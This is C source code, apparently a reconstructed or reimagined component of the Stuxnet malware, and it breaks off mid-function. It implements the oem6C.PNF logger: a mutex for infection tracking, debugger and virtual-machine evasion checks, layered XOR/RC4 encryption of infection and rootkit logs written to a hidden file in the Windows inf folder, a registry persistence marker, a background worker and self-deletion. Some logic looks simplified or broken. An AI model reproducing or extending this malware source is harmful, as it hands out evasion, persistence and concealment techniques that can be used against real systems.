/*
 * Reference from Main/Stuxnet. Readable.
 */

#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define OEM6C_MAGIC                     0x4F454D36
#define OEM6C_VERSION                   0x00010400
#define OEM6C_PNF_SIZE                  323848
#define OEM6C_MAX_PATH                  260
#define OEM6C_BUFFER_SIZE               4096
#define OEM6C_MAX_ENTRIES               4096

#define OEM6C_REG_KEY                   L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define OEM6C_REG_VALUE                 L"19790509"

#define OEM6C_ENTRY_TYPE_CONNECTION     0x2DA6
#define OEM6C_ENTRY_TYPE_S7P_MCP        0x246E
#define OEM6C_ENTRY_TYPE_NETWORK        0xF409
#define OEM6C_ENTRY_TYPE_INFECTION      0x7A2B
#define OEM6C_ENTRY_TYPE_ROOTKIT        0xF604

#define OEM6C_ENTRY_SUBTYPE_CONNECTION_1 0x0001
#define OEM6C_ENTRY_SUBTYPE_CONNECTION_2 0x0002
#define OEM6C_ENTRY_SUBTYPE_CONNECTION_3 0x0003

#define OEM6C_ENTRY_SUBTYPE_S7P_1       0x0001
#define OEM6C_ENTRY_SUBTYPE_S7P_2       0x0002
#define OEM6C_ENTRY_SUBTYPE_S7P_3       0x0003
#define OEM6C_ENTRY_SUBTYPE_S7P_4       0x0004
#define OEM6C_ENTRY_SUBTYPE_S7P_5       0x0005
#define OEM6C_ENTRY_SUBTYPE_S7P_6       0x0006

#define OEM6C_ENTRY_SUBTYPE_NETWORK_1   0x0001
#define OEM6C_ENTRY_SUBTYPE_NETWORK_2   0x0002
#define OEM6C_ENTRY_SUBTYPE_NETWORK_3   0x0003

#define OEM6C_ENTRY_SUBTYPE_INFECTION_2 0x0002
#define OEM6C_ENTRY_SUBTYPE_INFECTION_5 0x0005
#define OEM6C_ENTRY_SUBTYPE_INFECTION_6 0x0006
#define OEM6C_ENTRY_SUBTYPE_INFECTION_7 0x0007
#define OEM6C_ENTRY_SUBTYPE_INFECTION_8 0x0008

#define OEM6C_ENTRY_SUBTYPE_ROOTKIT_5   0x0005

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _OEM6C_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwEntryCount;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwReserved[8];
} OEM6C_HEADER, * POEM6C_HEADER;

typedef struct _OEM6C_LOG_ENTRY {
    WORD wType;
    WORD wSubType;
    DWORD dwTimestamp;
    DWORD dwDataLength;
    BYTE bData[512];
} OEM6C_LOG_ENTRY, * POEM6C_LOG_ENTRY;

typedef struct _OEM6C_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[OEM6C_MAX_PATH];
    WCHAR szSystemPath[OEM6C_MAX_PATH];
    WCHAR szWindowsPath[OEM6C_MAX_PATH];
    WCHAR szInfPath[OEM6C_MAX_PATH];
    WCHAR szPNFPath[OEM6C_MAX_PATH];
    BYTE bReserved[256];
} OEM6C_CTX, * POEM6C_CTX;

static OEM6C_CTX g_Oem6cCtx;
static BOOL g_bInitialized = FALSE;
static BYTE g_EncryptionKey[32] = {
    0x5C, 0x3B, 0x2D, 0x1A, 0x8E, 0xE1, 0x7C, 0x47,
    0x2A, 0x5D, 0x72, 0x09, 0xD4, 0x4F, 0x0B, 0x16,
    0x81, 0x2E, 0x6A, 0x3F, 0xB2, 0x4D, 0x08, 0x53,
    0x7F, 0x1C, 0x69, 0x06, 0x3E, 0x95, 0x2B, 0xD0
};

static OEM6C_LOG_ENTRY g_LogEntries[OEM6C_MAX_ENTRIES];
static DWORD g_dwEntryCount = 0;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwLogWriteCount = 0;
static DWORD g_dwLogReadCount = 0;

static BOOL OEM6C_InitNtImports(VOID);
static BOOL OEM6C_Init(VOID);
static VOID OEM6C_Cleanup(VOID);
static BOOL OEM6C_CheckMutex(VOID);
static BOOL OEM6C_IsExpired(VOID);
static BOOL OEM6C_CheckDebugger(VOID);
static BOOL OEM6C_CheckVMware(VOID);
static DWORD OEM6C_ComputeCRC32(PBYTE pData, DWORD dwSize);
static VOID OEM6C_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize);
static VOID OEM6C_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox);
static VOID OEM6C_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ);
static VOID OEM6C_SimpleDecrypt(PBYTE pData, DWORD dwSize);
static VOID OEM6C_SimpleEncrypt(PBYTE pData, DWORD dwSize);
static BOOL OEM6C_DecryptPNF(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize);
static BOOL OEM6C_EncryptPNF(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize);
static BOOL OEM6C_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize);
static BOOL OEM6C_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL OEM6C_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize);
static BOOL OEM6C_AddLogEntry(WORD wType, WORD wSubType, PBYTE pData, DWORD dwDataLength);
static BOOL OEM6C_WriteLogEntry(POEM6C_LOG_ENTRY pEntry);
static BOOL OEM6C_ReadLogEntry(DWORD dwIndex, POEM6C_LOG_ENTRY pEntry);
static BOOL OEM6C_SaveLogToDisk(VOID);
static BOOL OEM6C_LoadLogFromDisk(VOID);
static BOOL OEM6C_LogConnection(BOOL bSuccess);
static BOOL OEM6C_LogS7PProject(LPCWSTR szPath, DWORD dwType);
static BOOL OEM6C_LogNetwork(LPCWSTR szServerName);
static BOOL OEM6C_LogInfection(DWORD dwSubType);
static BOOL OEM6C_LogRootkit(VOID);
static BOOL OEM6C_ExtractAndSavePNF(VOID);
static BOOL OEM6C_WriteRegistry(VOID);
static BOOL OEM6C_ReadRegistry(VOID);
static DWORD WINAPI OEM6C_WorkerThread(LPVOID lpParam);
static BOOL OEM6C_StartWorker(VOID);
static BOOL OEM6C_StopWorker(VOID);
static BOOL OEM6C_SelfDestruct(VOID);
static BOOL OEM6C_Execute(VOID);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);
DWORD WINAPI Export21(VOID);
DWORD WINAPI Export22(VOID);
DWORD WINAPI Export23(VOID);
DWORD WINAPI Export24(VOID);
DWORD WINAPI Export25(VOID);
DWORD WINAPI Export26(VOID);
DWORD WINAPI Export27(VOID);
DWORD WINAPI Export28(VOID);
DWORD WINAPI Export29(VOID);
DWORD WINAPI Export30(VOID);

static BOOL OEM6C_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    return TRUE;
}

static BOOL OEM6C_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_Oem6cCtx, sizeof(OEM6C_CTX));
    g_Oem6cCtx.dwMagic = OEM6C_MAGIC;
    g_Oem6cCtx.dwVersion = OEM6C_VERSION;
    g_Oem6cCtx.dwPid = GetCurrentProcessId();
    g_Oem6cCtx.dwTid = GetCurrentThreadId();
    g_Oem6cCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_Oem6cCtx.csLock);
    GetModuleFileNameW(NULL, g_Oem6cCtx.szModulePath, OEM6C_MAX_PATH);
    GetSystemDirectoryW(g_Oem6cCtx.szSystemPath, OEM6C_MAX_PATH);
    GetWindowsDirectoryW(g_Oem6cCtx.szWindowsPath, OEM6C_MAX_PATH);
    wsprintfW(g_Oem6cCtx.szInfPath, L"%s\\inf", g_Oem6cCtx.szWindowsPath);
    wsprintfW(g_Oem6cCtx.szPNFPath, L"%s\\oem6C.PNF", g_Oem6cCtx.szInfPath);
    OEM6C_InitNtImports();
    ZeroMemory(g_LogEntries, sizeof(g_LogEntries));
    g_dwEntryCount = 0;
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID OEM6C_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_Oem6cCtx.hMutex) {
        CloseHandle(g_Oem6cCtx.hMutex);
        g_Oem6cCtx.hMutex = NULL;
    }
    if (g_Oem6cCtx.hThread) {
        CloseHandle(g_Oem6cCtx.hThread);
        g_Oem6cCtx.hThread = NULL;
    }
    if (g_Oem6cCtx.hStopEvent) {
        CloseHandle(g_Oem6cCtx.hStopEvent);
        g_Oem6cCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_Oem6cCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL OEM6C_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_Oem6cCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL OEM6C_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL OEM6C_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    DWORD dwDebugPort = 0;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM6C_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD OEM6C_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID OEM6C_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;
    if (!pData || dwSize == 0 || !pKey || dwKeySize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= pKey[i % dwKeySize];
    }
}

static VOID OEM6C_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox) {
    DWORD i, j;
    BYTE temp;
    if (!pKey || dwKeySize == 0 || !pSBox) return;
    for (i = 0; i < 256; i++) {
        pSBox[i] = (BYTE)i;
    }
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + pSBox[i] + pKey[i % dwKeySize]) & 0xFF;
        temp = pSBox[i];
        pSBox[i] = pSBox[j];
        pSBox[j] = temp;
    }
}

static VOID OEM6C_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ) {
    DWORD i;
    BYTE temp;
    if (!pData || dwSize == 0 || !pSBox || !pdwI || !pdwJ) return;
    for (i = 0; i < dwSize; i++) {
        *pdwI = (*pdwI + 1) & 0xFF;
        *pdwJ = (*pdwJ + pSBox[*pdwI]) & 0xFF;
        temp = pSBox[*pdwI];
        pSBox[*pdwI] = pSBox[*pdwJ];
        pSBox[*pdwJ] = temp;
        pData[i] ^= pSBox[(pSBox[*pdwI] + pSBox[*pdwJ]) & 0xFF];
    }
}

static VOID OEM6C_SimpleDecrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static VOID OEM6C_SimpleEncrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL OEM6C_DecryptPNF(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize) {
    POEM6C_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwDataSize;
    DWORD dwKey = 0x01AE0000;
    if (!pEncrypted || dwEncryptedSize == 0 || !pDecrypted || !pdwDecryptedSize) {
        return FALSE;
    }
    if (dwEncryptedSize < sizeof(OEM6C_HEADER)) {
        return FALSE;
    }
    pHeader = (POEM6C_HEADER)pEncrypted;
    if (pHeader->dwMagic != OEM6C_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        return FALSE;
    }
    dwDataSize = dwEncryptedSize - sizeof(OEM6C_HEADER);
    if (dwDataSize > *pdwDecryptedSize) {
        return FALSE;
    }
    memcpy(pDecrypted, pEncrypted + sizeof(OEM6C_HEADER), dwDataSize);
    for (DWORD round = 0; round < 3; round++) {
        OEM6C_XORDecrypt(pDecrypted, dwDataSize, (PBYTE)&dwKey, sizeof(DWORD));
        OEM6C_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        OEM6C_RC4Crypt(pDecrypted, dwDataSize, SBox, &i, &j);
        OEM6C_SimpleDecrypt(pDecrypted, dwDataSize);
    }
    *pdwDecryptedSize = dwDataSize;
    return TRUE;
}

static BOOL OEM6C_EncryptPNF(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize) {
    POEM6C_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwTotalSize;
    DWORD dwKey = 0x01AE0000;
    if (!pDecrypted || dwDecryptedSize == 0 || !pEncrypted || !pdwEncryptedSize) {
        return FALSE;
    }
    dwTotalSize = sizeof(OEM6C_HEADER) + dwDecryptedSize;
    if (dwTotalSize > *pdwEncryptedSize) {
        return FALSE;
    }
    pHeader = (POEM6C_HEADER)pEncrypted;
    pHeader->dwMagic = OEM6C_MAGIC;
    pHeader->dwVersion = OEM6C_VERSION;
    pHeader->dwTotalSize = dwTotalSize;
    pHeader->dwEntryCount = g_dwEntryCount;
    pHeader->dwChecksum = OEM6C_ComputeCRC32(pDecrypted, dwDecryptedSize);
    pHeader->dwTimestamp = GetTickCount();
    ZeroMemory(pHeader->dwReserved, sizeof(pHeader->dwReserved));
    memcpy(pEncrypted + sizeof(OEM6C_HEADER), pDecrypted, dwDecryptedSize);
    for (DWORD round = 0; round < 3; round++) {
        OEM6C_SimpleEncrypt(pEncrypted + sizeof(OEM6C_HEADER), dwDecryptedSize);
        OEM6C_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        OEM6C_RC4Crypt(pEncrypted + sizeof(OEM6C_HEADER), dwDecryptedSize, SBox, &i, &j);
        OEM6C_XORDecrypt(pEncrypted + sizeof(OEM6C_HEADER), dwDecryptedSize, (PBYTE)&dwKey, sizeof(DWORD));
    }
    *pdwEncryptedSize = dwTotalSize;
    return TRUE;
}

static BOOL OEM6C_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;
    if (!szPath || !ppData || !pdwSize) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    *ppData = pData;
    *pdwSize = dwRead;
    return TRUE;
}

static BOOL OEM6C_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL OEM6C_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL OEM6C_AddLogEntry(WORD wType, WORD wSubType, PBYTE pData, DWORD dwDataLength) {
    POEM6C_LOG_ENTRY pEntry;
    if (g_dwEntryCount >= OEM6C_MAX_ENTRIES) {
        return FALSE;
    }
    EnterCriticalSection(&g_Oem6cCtx.csLock);
    pEntry = &g_LogEntries[g_dwEntryCount];
    pEntry->wType = wType;
    pEntry->wSubType = wSubType;
    pEntry->dwTimestamp = GetTickCount();
    if (pData && dwDataLength > 0) {
        pEntry->dwDataLength = min(dwDataLength, 512);
        memcpy(pEntry->bData, pData, pEntry->dwDataLength);
    } else {
        pEntry->dwDataLength = 0;
        ZeroMemory(pEntry->bData, 512);
    }
    g_dwEntryCount++;
    LeaveCriticalSection(&g_Oem6cCtx.csLock);
    return TRUE;
}

static BOOL OEM6C_WriteLogEntry(POEM6C_LOG_ENTRY pEntry) {
    if (!pEntry) return FALSE;
    return OEM6C_AddLogEntry(pEntry->wType, pEntry->wSubType, pEntry->bData, pEntry->dwDataLength);
}

static BOOL OEM6C_ReadLogEntry(DWORD dwIndex, POEM6C_LOG_ENTRY pEntry) {
    if (!pEntry || dwIndex >= g_dwEntryCount) {
        return FALSE;
    }
    EnterCriticalSection(&g_Oem6cCtx.csLock);
    memcpy(pEntry, &g_LogEntries[dwIndex], sizeof(OEM6C_LOG_ENTRY));
    LeaveCriticalSection(&g_Oem6cCtx.csLock);
    return TRUE;
}

static BOOL OEM6C_SaveLogToDisk(VOID) {
    PBYTE pData;
    DWORD dwDataSize;
    DWORD dwEncryptedSize;
    PBYTE pEncrypted;
    BOOL bResult;
    if (g_dwEntryCount == 0) {
        return TRUE;
    }
    dwDataSize = g_dwEntryCount * sizeof(OEM6C_LOG_ENTRY);
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDataSize);
    if (!pData) {
        return FALSE;
    }
    EnterCriticalSection(&g_Oem6cCtx.csLock);
    memcpy(pData, g_LogEntries, dwDataSize);
    LeaveCriticalSection(&g_Oem6cCtx.csLock);
    dwEncryptedSize = dwDataSize + sizeof(OEM6C_HEADER) + 4096;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    bResult = OEM6C_EncryptPNF(pData, dwDataSize, pEncrypted, &dwEncryptedSize);
    if (bResult) {
        bResult = OEM6C_WritePNFToDisk(g_Oem6cCtx.szPNFPath, pEncrypted, dwEncryptedSize);
        if (bResult) {
            g_dwLogWriteCount++;
        }
    }
    HeapFree(GetProcessHeap(), 0, pData);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    return bResult;
}

static BOOL OEM6C_LoadLogFromDisk(VOID) {
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    PBYTE pDecrypted;
    DWORD dwDecryptedSize;
    POEM6C_HEADER pHeader;
    BOOL bResult;
    if (!OEM6C_ReadPNFFromDisk(g_Oem6cCtx.szPNFPath, &pEncrypted, &dwEncryptedSize)) {
        return FALSE;
    }
    if (dwEncryptedSize < sizeof(OEM6C_HEADER)) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    pHeader = (POEM6C_HEADER)pEncrypted;
    if (pHeader->dwMagic != OEM6C_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    dwDecryptedSize = dwEncryptedSize + 4096;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    bResult = OEM6C_DecryptPNF(pEncrypted, dwEncryptedSize, pDecrypted, &dwDecryptedSize);
    if (bResult) {
        EnterCriticalSection(&g_Oem6cCtx.csLock);
        g_dwEntryCount = dwDecryptedSize / sizeof(OEM6C_LOG_ENTRY);
        if (g_dwEntryCount > OEM6C_MAX_ENTRIES) {
            g_dwEntryCount = OEM6C_MAX_ENTRIES;
        }
        memcpy(g_LogEntries, pDecrypted, g_dwEntryCount * sizeof(OEM6C_LOG_ENTRY));
        LeaveCriticalSection(&g_Oem6cCtx.csLock);
        g_dwLogReadCount++;
    }
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    return bResult;
}

static BOOL OEM6C_LogConnection(BOOL bSuccess) {
    WORD wSubType;
    if (bSuccess) {
        wSubType = OEM6C_ENTRY_SUBTYPE_CONNECTION_2;
    } else {
        wSubType = OEM6C_ENTRY_SUBTYPE_CONNECTION_1;
    }
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_CONNECTION, wSubType, NULL, 0);
}

static BOOL OEM6C_LogS7PProject(LPCWSTR szPath, DWORD dwType) {
    WORD wSubType;
    BYTE bData[512];
    DWORD dwDataLength;
    if (!szPath) return FALSE;
    dwDataLength = (DWORD)(wcslen(szPath) * sizeof(WCHAR));
    if (dwDataLength > 512) dwDataLength = 512;
    memcpy(bData, szPath, dwDataLength);
    switch (dwType) {
        case 1:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_1;
            break;
        case 2:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_2;
            break;
        case 3:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_3;
            break;
        case 4:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_4;
            break;
        case 5:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_5;
            break;
        case 6:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_6;
            break;
        default:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_1;
            break;
    }
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_S7P_MCP, wSubType, bData, dwDataLength);
}

static BOOL OEM6C_LogNetwork(LPCWSTR szServerName) {
    BYTE bData[512];
    DWORD dwDataLength;
    if (!szServerName) return FALSE;
    dwDataLength = (DWORD)(wcslen(szServerName) * sizeof(WCHAR));
    if (dwDataLength > 512) dwDataLength = 512;
    memcpy(bData, szServerName, dwDataLength);
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_NETWORK, OEM6C_ENTRY_SUBTYPE_NETWORK_1, bData, dwDataLength);
}

static BOOL OEM6C_LogInfection(DWORD dwSubType) {
    BYTE bData[4];
    *(DWORD*)bData = GetTickCount();
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_INFECTION, (WORD)dwSubType, bData, 4);
}

static BOOL OEM6C_LogRootkit(VOID) {
    BYTE bData[4];
    *(DWORD*)bData = 0x00000001;
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_ROOTKIT, OEM6C_ENTRY_SUBTYPE_ROOTKIT_5, bData, 4);
}

static BOOL OEM6C_ExtractAndSavePNF(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!OEM6C_ReadPNFFromResource(&pData, &dwSize)) {
        return FALSE;
    }
    if (!OEM6C_WritePNFToDisk(g_Oem6cCtx.szPNFPath, pData, dwSize)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return TRUE;
}

static BOOL OEM6C_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, OEM6C_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, OEM6C_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL OEM6C_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, OEM6C_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, OEM6C_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI OEM6C_WorkerThread(LPVOID lpParam) {
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_Oem6cCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (OEM6C_IsExpired()) {
            break;
        }
        if (!OEM6C_ReadRegistry()) {
            OEM6C_WriteRegistry();
        }
        OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_2);
        g_dwInfectionCount++;
        dwTick = GetTickCount();
        if (g_dwEntryCount > 100) {
            OEM6C_SaveLogToDisk();
        }
    }
    return 0;
}

static BOOL OEM6C_StartWorker(VOID) {
    g_Oem6cCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_Oem6cCtx.hStopEvent) return FALSE;
    g_Oem6cCtx.hThread = CreateThread(NULL, 0, OEM6C_WorkerThread, NULL, 0, NULL);
    if (!g_Oem6cCtx.hThread) {
        CloseHandle(g_Oem6cCtx.hStopEvent);
        g_Oem6cCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM6C_StopWorker(VOID) {
    if (g_Oem6cCtx.hStopEvent) {
        SetEvent(g_Oem6cCtx.hStopEvent);
    }
    if (g_Oem6cCtx.hThread) {
        WaitForSingleObject(g_Oem6cCtx.hThread, 5000);
        CloseHandle(g_Oem6cCtx.hThread);
        g_Oem6cCtx.hThread = NULL;
    }
    if (g_Oem6cCtx.hStopEvent) {
        CloseHandle(g_Oem6cCtx.hStopEvent);
        g_Oem6cCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL OEM6C_SelfDestruct(VOID) {
    DeleteFileW(g_Oem6cCtx.szPNFPath);
    return TRUE;
}

static BOOL OEM6C_Execute(VOID) {
    HANDLE hMutex;
    if (!OEM6C_Init()) return FALSE;
    if (OEM6C_IsExpired()) {
